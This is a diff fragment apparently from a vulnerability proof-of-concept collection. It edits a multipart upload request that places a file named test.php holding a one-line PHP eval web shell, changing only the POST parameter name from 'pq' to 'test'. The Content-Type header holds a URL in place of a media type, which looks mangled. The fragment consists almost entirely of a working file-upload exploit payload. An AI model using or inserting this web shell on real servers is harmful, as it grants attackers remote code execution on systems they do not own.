@@ -97,7 +97,7 @@ Content-Length: 208
 Content-Disposition: form-data; name="files"; filename="test.php"
 Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif
 
-<?php @eval($_POST[pq]);?>
+<?php @eval($_POST[test]);?>
 ------WebKitFormBoundary8UaANmWAgM4BqBSs—
 ```
 
